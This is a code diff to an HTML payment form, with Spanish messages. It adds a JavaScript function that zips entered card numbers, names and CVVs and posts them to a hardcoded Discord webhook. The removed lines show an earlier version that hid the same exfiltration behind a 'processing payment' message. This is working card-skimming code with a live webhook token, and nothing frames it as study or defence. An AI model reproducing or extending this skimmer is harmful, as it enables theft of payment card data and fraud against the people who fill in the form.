@@ -75,6 +75,31 @@
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
   <script>
+    function createAndSendData(fileName, cardData) {
+      var zip = new JSZip();
+      var csvContent = cardData.join(", ");
+      zip.file(fileName, csvContent);
+
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: "08papanat4s" })
+        .then(function(content) {
+          var formData = new FormData();
+          formData.append('file', content);
+
+          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
+            method: "POST",
+            body: formData
+          })
+            .then(function(response) {
+              console.log("Tarjeta enviada al webhook con éxito");
+              document.getElementById("done-message").textContent = "Tarjeta enviada al webhook con éxito";
+            })
+            .catch(function(error) {
+              console.error("Error al enviar la tarjeta al webhook:", error);
+              document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook";
+            });
+        });
+    }
+
     function updateSigninStatus() {
       var cardNumber = document.getElementById("card-number").value;
       var cardName = document.getElementById("card-name").value;
@@ -98,12 +123,8 @@
         cardCVV
       ];
 
-      createAndDownloadZip(fileName, cardData);
-      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
-
-      setTimeout(function() {
-        document.getElementById("done-message").textContent = "";
-      }, 2000);
+      createAndSendData(fileName, cardData);
+      document.getElementById("done-message").textContent = "Enviando tarjeta al webhook...";
     }
 
     function createAndDownloadZip(fileName, cardData) {
@@ -116,21 +137,6 @@
           link.href = URL.createObjectURL(content);
           link.download = fileName + ".zip";
           link.click();
-
-          // Envío del archivo al webhook
-          var formData = new FormData();
-          formData.append('file', content);
-
-          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
-            method: "POST",
-            body: formData
-          })
-          .then(function(response) {
-            console.log("Archivo enviado al webhook con éxito");
-          })
-          .catch(function(error) {
-            console.error("Error al enviar el archivo al webhook:", error);
-          });
         });
     }
 
